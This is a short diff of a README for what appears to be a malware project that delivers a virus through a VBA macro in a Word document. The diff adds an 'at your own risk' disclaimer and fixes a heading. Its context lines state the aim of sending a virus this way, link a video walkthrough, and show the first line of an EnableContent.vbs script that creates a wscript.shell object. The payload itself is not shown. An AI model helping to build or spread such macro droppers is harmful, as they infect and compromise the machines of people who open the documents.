@@ -2,6 +2,7 @@
 
 Sending executables usually isn't the best option. 
 But we can use VBA script Macro in a Word document in order to send a virus. 
+You use these files at your own risk.
 
 Detailed steps of how I made it and explanation of codes can be seen at:
 https://www.youtube.com/watch?v=UCyQlx5fzGI
@@ -28,7 +29,7 @@ End Sub
 
 -------------------------------
 
-in EnableContent.vbs:
+In EnableContent.vbs:
 -------------------------------
 
 set x=wscript.createobject ("wscript.shell") 
